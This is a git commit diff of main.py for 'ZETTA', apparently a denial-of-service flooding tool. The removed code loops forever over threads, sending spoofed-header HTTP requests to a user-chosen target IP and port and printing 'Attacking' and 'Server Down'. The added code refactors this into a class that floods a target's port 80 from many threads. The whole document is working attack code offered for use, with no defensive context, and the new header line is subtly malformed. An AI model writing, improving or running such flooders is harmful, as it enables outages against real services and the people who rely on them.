176e904d5c67cc1a098d9611bbcf150cafce9354
kirk <122225913+kirk65@users.noreply.github.com>
2023-03-16 13:31:31 +0000

    Update main.py

--- main.py
+++ main.py
@@ -1,67 +1,46 @@
 # ZETTA
 # v0.0.1
 
-import socket, requests
-import random
+import socket
 import threading
+from colorama import Fore as F
 
-useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
-"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
-"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
-"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
-"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
-"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
-"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
-"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
-"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
-"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
-"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
-ref=['http://www.bing.com/search?q=',
-'https://www.yandex.com/yandsearch?text=',
-'https://duckduckgo.com/?q=']
-acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-"Accept-Encoding: gzip, deflate\r\n",
-"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
-"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
-"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
-"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
-"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-"Accept-Language: en-US,en;q=0.5\r\n"]
-
-print('ZETTA')
-
-ip = str(input('[+] Target: '))
-port = int(input('[+] Port: '))
-pack = int(input('[+] Packet/s: '))
-thread = int(input('[+] Threads: '))
-def start():
-    global useragents, ref, acceptall
-    hh = random._urandom(3016)
-    xx = int(0)
-    useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
-    accept = random.choice(acceptall)
-    reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
-    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
-    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
-    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
-    main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
-    while True:
+class Zetta:
+    def __init__(self, ip):
+        self.count = 0
+        self.ip = ip
+        self.agent = f"User-Agent: Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1\r\n"
+        self.accept = "Accept-Encoding: gzip, deflate"
+        self.reffer = f"Referer: https://duckduckgo.com/?q= {self.ip}\r\n"
+        self.content = "Content-Type: application/x-www-form-urlencoded\r\n"
+        self.length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+        self.target_host = f"GET / HTTP/1.1\r\nHost: {self.ip}:80\r\n"
+        self.main_req  = f"{self.target_host} {self.agent} {self.accept} {self.reffer} {self.content} {self.length}\r\n"
+        self.r = F.RED
+        self.g = F.GREEN
+        self.y = F.YELLOW
+        self.re = F.RESET
+        
+    def send(self):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((str(ip),int(port)))
-            s.send(str.encode(main_req))
-            for i in range(pack):
-                s.send(str.encode(main_req))
-            xx += random.randint(0, int(pack))
-            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
-        except:
+            s.connect((self.ip, 80))
+            s.send(str.encode(self.main_req))
+            self.count += 1
+            print(f"{self.g}[+]{self.re} Sent packet {self.count}")
+            
+        except Exception as e:
             s.close()
-            print('[+] Server Down.')
+            print(f"{self.r}[-]{self.re} Didn't send packet. Error: {e}")
 
-for x in range(thread):
-    thred = threading.Thread(target=start)
-    thred.start()
+def main():
+    ip = str(input(f"{F.YELLOW}[?]{F.RESET} Target: "))
+    pack = int(input(f"{F.YELLOW}[?]{F.RESET} Packet/s: "))
+    zetta = Zetta(ip)
+
+    for _ in range(pack):
+        t = threading.Thread(target = zetta.send)
+        t.start()
+        
+if __name__ == "__main__":
+    main()
